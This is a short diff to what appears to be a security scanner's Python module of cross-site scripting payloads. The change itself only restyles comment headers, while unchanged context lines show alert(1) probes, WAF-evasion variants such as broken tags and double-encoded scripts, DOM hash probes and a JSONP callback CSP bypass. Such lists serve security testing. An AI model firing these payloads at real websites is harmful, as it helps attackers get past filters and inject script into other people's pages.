@@ -1,6 +1,6 @@
 """XSS payloads — reflected, DOM, stored, CSP bypass."""
 
-# -- Tier 1: Classic reflected XSS ---------------------------------------------
+# ── Tier 1: Classic reflected XSS ─────────────────────────────────────────────
 XSS_T1 = [
     "<script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
@@ -12,7 +12,7 @@ XSS_T1 = [
     "javascript:alert(1)",
 ]
 
-# -- Tier 2: WAF bypass / encoding ---------------------------------------------
+# ── Tier 2: WAF bypass / encoding ─────────────────────────────────────────────
 XSS_T2 = [
     # Broken tags
     "<scr<script>ipt>alert(1)</scr</script>ipt>",
@@ -38,7 +38,7 @@ XSS_T2 = [
     "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
 ]
 
-# -- DOM XSS probes (check JS source sinks) ------------------------------------
+# ── DOM XSS probes (check JS source sinks) ────────────────────────────────────
 XSS_DOM = [
     # Hash-based
     "#<script>alert(1)</script>",
@@ -50,7 +50,7 @@ XSS_DOM = [
     "javascript:document.write('<script>alert(1)<\\/script>')",
 ]
 
-# -- CSP bypass techniques -----------------------------------------------------
+# ── CSP bypass techniques ─────────────────────────────────────────────────────
 XSS_CSP_BYPASS = [
     # JSONP abuse
     "?callback=alert(1)//",
